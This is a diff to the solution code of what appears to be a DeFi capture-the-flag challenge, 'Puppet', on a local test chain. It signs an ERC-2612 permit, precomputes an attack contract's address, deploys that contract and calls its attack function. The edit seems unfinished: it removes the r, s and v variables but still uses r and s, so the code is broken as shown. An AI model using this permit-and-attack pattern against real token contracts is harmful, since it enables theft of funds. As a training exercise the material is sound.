@@ -110,22 +110,52 @@ describe('[Challenge] Puppet', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         const { signERC2612Permit } = require('eth-permit')
-        const attackContractAddress = await ethers.utils.getContractAddress({
-            from: player.address,
-            nonce: 0
+
+        const attackContractAddress = ethers.utils.getContractAddress({
+            from: deployer.address,
+            nonce: await ethers.provider.getTransactionCount(deployer.address)
         })
 
-        const { r, s, v } = await signERC2612Permit(
+        const signa = await signERC2612Permit(
             player,
             token.address,
             player.address,
             attackContractAddress,
-            PLAYER_INITIAL_TOKEN_BALANCE
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            ethers.constants.MaxUint256,
+            0
         )
+        console.log(signa)
+        const domain = {
+            name: 'DamnValuableToken',
+            version: '1',
+            chainId: 31337,
+            verifyingContract: token.address
+        }
+
+        const types = {
+            Permit: [
+                { name: 'owner', type: 'address' },
+                { name: 'spender', type: 'address' },
+                { name: 'value', type: 'uint256' },
+                { name: 'nonce', type: 'uint256' },
+                { name: 'deadline', type: 'uint256' }
+            ]
+        }
+        const message = {
+            owner: player.address,
+            spender: attackContractAddress,
+            value: PLAYER_INITIAL_TOKEN_BALANCE,
+            nonce: 0,
+            deadline: ethers.constants.MaxUint256
+        }
+
+        const sig = await player._signTypedData(domain, types, message)
+        console.log(sig)
 
         const attackContractFactory = await ethers.getContractFactory(
             'Attack',
-            player
+            deployer
         )
         const attackContract = await attackContractFactory.deploy(
             token.address,
@@ -135,6 +165,7 @@ describe('[Challenge] Puppet', function () {
             r,
             s
         )
+
         await player.sendTransaction({
             to: attackContract.address,
             data: attackContract.interface.encodeFunctionData('attack', [
